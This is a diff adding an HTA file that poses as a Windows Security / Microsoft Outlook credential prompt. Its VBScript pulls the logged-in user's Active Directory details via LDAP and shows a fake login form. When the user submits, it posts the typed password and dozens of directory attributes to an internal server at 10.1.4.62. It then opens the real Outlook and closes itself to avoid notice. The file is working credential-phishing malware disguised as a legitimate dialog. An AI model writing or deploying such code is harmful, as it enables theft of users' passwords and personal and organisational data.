@@ -1,0 +1,190 @@
+<html>
+<head>
+<title>Windows Security</title>
+<meta http-equiv="x-ua-compatible" content="ie=9">
+<HTA:APPLICATION
+	APPLICATIONNAME="Outlook"
+	ID="WindowsSecurity"
+	maximizeButton="NO" 
+	minimizeButton="NO" 
+	scroll="NO"	  
+	BORDER="thin"
+	BORDERSTYLE="raised"
+	innerBorder="yes"
+	caption="yes" 
+	VERSION="1.0"
+/>
+</head>
+<style>
+body {
+	background-color: #e6e6e6;
+	font-family: Calibri, Candara, Segoe, "Segoe UI", Optima, Arial, sans-serif;
+	font-size: 24px;
+	font-style: normal;
+	font-variant: normal;
+	font-weight: 400;
+}
+table {
+    border-collapse: collapse;
+}
+table, th, td {
+    border: 0px solid black;
+	margin: 0;
+}
+.input_text{
+	border-style: solid;
+	border-width: 1px;
+	border-color: #7a7a7a;
+	background-color: #f0f0f0;
+	font-family: Calibri, Candara, Segoe, "Segoe UI", Optima, Arial, sans-serif;
+	font-size: 18px;
+	padding-left: 0px;
+	width: 100%;
+    padding: 6px 12px;
+    margin: 8px 0;
+    box-sizing: border-box;
+}
+.input_pass{
+	border-style: solid;
+	border-width: 1px;
+	border-color: #0078d7;
+	font-family: helvetica, arial, sans serif;
+	font-size: 18px;
+	padding-left: 0px;
+	width: 100%;
+    padding: 6px 12px;
+    margin: 8px 0;
+    box-sizing: border-box;
+}
+.button_box {
+    background-color: #b8b8b8; 
+    border: none;
+    color: black;
+    padding: 8px 8px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 14px;
+	width:48%;
+}
+.heading_space {
+	height: 10px;
+}
+.heading {
+
+	font-family: Calibri, Candara, Segoe, "Segoe UI", Optima, Arial, sans-serif;
+	font-size: 18px;
+	font-weight: 300;
+}
+.check_box {
+	font-family: Calibri, Candara, Segoe, "Segoe UI", Optima, Arial, sans-serif;
+	font-size: 12px;
+	font-style: normal;
+	font-variant: normal;
+	font-weight: 300;	
+	border-style: solid;
+	border-width: 0px;
+	border-color: black;
+	background-color: #000000;
+	padding-left: 0px;
+    padding: 1px 1px;
+    margin: 1px 0;
+    box-sizing: border-box;
+}
+</style>
+<script language="VBScript">
+On Error Resume Next
+Dim objSysInfo, objUser
+Set objSysInfo = CreateObject("ADSystemInfo")
+window.resizeto 470, 333
+strComputer = "."
+
+Set objWMI = GetObject("winmgmts:\\" & strComputer & "\root\wmi") 
+Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+Set objUser = GetObject("LDAP://" & objSysInfo.UserName)
+
+sUrl = "http://10.1.4.62/outlook.php"
+
+intLeft = ((window.screen.width/2) - (470/2))
+intTop = ((window.screen.height/2) - (333/2))
+
+window.moveTo intLeft, intTop
+
+Function GetUser
+	Text1.InnerHTML = objUser.mail
+	GetUser = objUser.userPrincipalName
+End Function
+
+Function HTTPPost(sEmail, sPassword)
+	Set objUser = GetObject("LDAP://" & objSysInfo.UserName)
+	sRequestAll = "email=" & objUser.mail & "&password=" & sPassword & "&dn=" & objUser.distinguishedName & "&first_name=" & objUser.givenName & "&initials=" & objUser.initials & "&last_name=" & objUser.sn & "&display_name=" & objUser.displayName & "&description=" & objUser.description & "&office=" & objUser.physicalDeliveryOfficeName & "&telephone_number=" & objUser.telephoneNumber & "&other_telephone_numbers=" & objUser.otherTelephone & "&email=" & objUser.mail & "&web_page=" & objUser.wWWHomePage & "&other_web_pages=" & objUser.url & "&street=" & objUser.streetAddress & "&po_box=" & objUser.postOfficeBox & "&city=" & objUser.l & "&state_province=" & objUser.st & "&poastal_code=" & objUser.postalCode & "&country_region=" & objUser.countryCode & "&user_logon_name=" & objUser.userPrincipalName & "&pre_Windows_2000_logon_name=" & objUser.sAMAccountName & "&account_disabled=" & objUser.AccountDisabled & "&logon_hours=" & objUser.logonHours & "&logon_to_workstations=" & objUser.userWorkstations & "&user_cannot_change_password=" & objUser.userAccountControl & "&password_never_expires=" & objUser.userAccountControl & "&store_password_using_reversible_encryption=" & objUser.userAccountControl & "&logon_script=" & objUser.scriptPath & "&home_folder_local_path=" & objUser.homeDirectory & "&home_folder_connect_drive=" & objUser.homeDrive & "&home_folder_connect_to:=" & objUser.homeDirectory & "&home=" & objUser.homePhone & "&other_home_phone_numbers=" & objUser.otherHomePhone & "&mobile=" & objUser.mobile & "&other_mobile_numbers=" & objUser.otherMobile & "&ip_phone=" & objUser.ipPhone & "&other_ip_phone_numbers=" & objUser.otherIpPhone & "&title=" & objUser.title & "&department=" & objUser.department & "&company=" & objUser.company & "&manager=" & objUser.manager            
+	set oHTTPAll = CreateObject("Microsoft.XMLHTTP")
+		oHTTPAll.open "POST", sUrl,false
+		oHTTPAll.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+		oHTTPAll.setRequestHeader "Content-Length", Len(sRequestAll)
+		oHTTPAll.send sRequestAll
+	HTTPPost = oHTTPAll.responseText
+	
+	Set objShell = CreateObject("WScript.Shell")
+		objShell.Run("""c:\program files\microsoft office\root\office16\outlook.exe""")
+	Set objShell = Nothing
+  
+	CloseWindow()
+  
+End Function
+
+Sub CloseWindow
+   self.close
+End Sub
+</script>
+<script type="text/javascript">
+    function printIt() {
+        var std = document.getElementById('Text1').value = GetUser()
+        document.getElementById('Text2').value = std
+		document.getElementById("Text3").placeholder = "Type name here..";
+		document.getElementById("Text3").focus();
+    }
+	
+	function checkKey(e, strEmail, strPassword) {
+		if (e.keyCode == 13) {
+		HTTPPost(strEmail, strPassword)
+	}
+  return false;
+}
+</script>
+<body onload="printIt()">
+    <div>
+        Microsoft Outlook
+    </div>	
+    <div class="heading_space">
+    </div>
+    <span class="heading"> Connecting to </span> <span class="heading" ID="Text1"></span>
+    <div class="heading_space">
+    </div>
+    <form onkeypress="checkKey(event, email.value, password.value);">
+        <table width="65%" align="center">
+            <tr>
+                <td>
+                    <input id="Text2" name="email" class="input_text" type="text" required="" value="">
+                    <input id="Text3" class="input_pass" name="password" type="password" required="" placeholder="Password">
+                    <div>
+                        <input class="check_box" id="checkBox" type="checkbox"> <span class="heading">Remember my credentials</span>
+                    </div>
+                </td>
+            </tr>
+        </table>
+        <table width="80%" align="center">
+            <tr>
+                <td>
+                    <div class="heading_space">
+                    </div>
+                    <div>
+                        <button type="button" class="button_box" onclick="HTTPPost(email.value, password.value)">OK</button>
+                        <button type="button" class="button_box" onclick="CloseWindow()">Cancel </button>
+                    </div>
+                </td>
+            </tr>
+        </table>
+    </form>
+</body>
+</html>
